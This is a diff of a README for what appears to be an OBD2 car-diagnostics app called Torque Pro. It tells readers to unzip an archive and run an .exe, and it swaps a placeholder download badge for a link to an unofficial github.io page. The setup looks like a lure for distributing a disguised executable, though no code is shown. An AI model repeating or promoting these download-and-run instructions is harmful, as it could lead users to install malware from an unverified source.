@@ -10,15 +10,13 @@ Unzip the archive to a separate folder.
 
 Run the .exe file to start the application.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://torque-pro.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
 
 ![Overview Screenshot 1](https://i.ytimg.com/vi/4Sw3lIrsIAA/sddefault.jpg)  
 ![Overview Screenshot 2](https://cdn-icon.bluestacks.com/XQHptNoUSlAvQseylASvA8CaYFdvO_o9dHaX8sb3l88RHo7NlRwOcNCO4KAZgPO1RyCd=h200)  
-![Overview Screenshot 3](https://via.placeholder.com/800x450.png?text=Fault+Code+Reader)  
-![Overview Screenshot 4](https://via.placeholder.com/800x450.png?text=Custom+OBD2+Gauges)  
 
 ## 🎯 Key Features
 ⚡️ **Real-Time Data:** Monitor engine parameters and performance stats live.  
